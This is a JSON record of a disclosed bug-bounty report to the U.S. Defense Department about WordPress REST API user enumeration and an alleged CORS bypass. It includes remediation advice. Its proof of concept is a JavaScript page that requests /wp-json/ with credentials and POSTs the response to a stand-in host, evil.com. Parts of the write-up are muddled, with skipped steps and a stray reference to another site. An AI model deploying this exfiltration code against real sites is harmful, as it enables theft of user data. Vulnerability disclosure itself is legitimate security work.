{
  "id": 768151,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjgxNTE=",
  "url": "https://hackerone.com/reports/768151",
  "title": "Bypassing CORS Misconfiguration Leads to Sensitive Exposure",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-01-04T15:52:16.243Z",
  "submitted_at": "2020-01-04T15:52:16.243Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "deb0con",
    "url": "/deb0con",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/uuzgbpy0admz05sef76979ln16oc/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-05-14T17:16:51.417Z",
  "bug_reporter_agreed_on_going_public_at": "2020-02-05T15:54:19.539Z",
  "team_member_agreed_on_going_public_at": "2020-05-14T17:16:51.331Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Hi!** Security Team @deptofdefense, \nIt's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in \nWordpress via API on \n*. ███████.\n\n***Description:***\nBy default Wordpress allow public access to Rest API to get informations about all users registered on the system.\n\nPlatform(s) Affected: [website]\n*. https://████/wp-json/\n\n##Steps To Reproduce:\n1) Repreat URL Vulnerable to Burp Suite\n2) If you add the ``Origin-parameter`` to the ``Request-header``, the responsive header will reject\n3) Bypassing Using Exploit CORS-With Sensitive\n4) Open Request Vulnerability URL in ``/wp-json/` , when you open the url, you can see ``path-routes`` disclousure\n**Proof On Concept:**\n```javascript\n<!DOCTYPE html>\n<html>\n<body>\n<center>\n<h3>Steal customer data!</h3>\n<html>\n<body>\n<button type='button' onclick='cors()'>Exploit</button>\n<p id='demo'></p>\n<script>\nfunction cors() {\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200) {\nvar a = this.responseText; // Sensitive data from niche.co about user account\ndocument.getElementById(\"demo\").innerHTML = a;\nxhttp.open(\"POST\", \"http://evil.com\", true);// Sending that data to Attacker's website\nxhttp.withCredentials = true;\nconsole.log(a);\nxhttp.send(\"data=\"+a);\n}\n};\nxhttp.open(\"GET\", \"https://██████/wp-json/\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\n</script>\n</body>\n</html>\n```\n6) save file as ``.html`` and open in mozzila-firefox , and **boom** sensitive has been exposure\n**Remediation:**\nThere are 2 ways that it's possible to fix this problem.\n**FIX 1** - It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request. \nReference: https://github.com/WP-API/WP-API/issues/2338\n**FIX 2** - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: \"^.rest_route=/wp/\") to a Not Found (404) or a Default Page.\n\n##POC Screenshots Material/References:\n  * ███████\n  * █████████\n  * █████\n\n## Impact\n\n1. It's possible to get all the users registered on the system and create a bruteforce directed to these users.\n2. Cross Misconfiguration -Leakage Sensitive Information",
  "weakness": {
    "id": 65,
    "name": "Business Logic Errors"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 142,
  "voters": [
    "sourc7",
    "0nlymohammed",
    "aoxsin",
    "dastan_9408",
    "deb0con",
    "sourceflow",
    "sheerwood",
    "0x1_aulia",
    "0x1b",
    "mrkalibot",
    "and 132 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
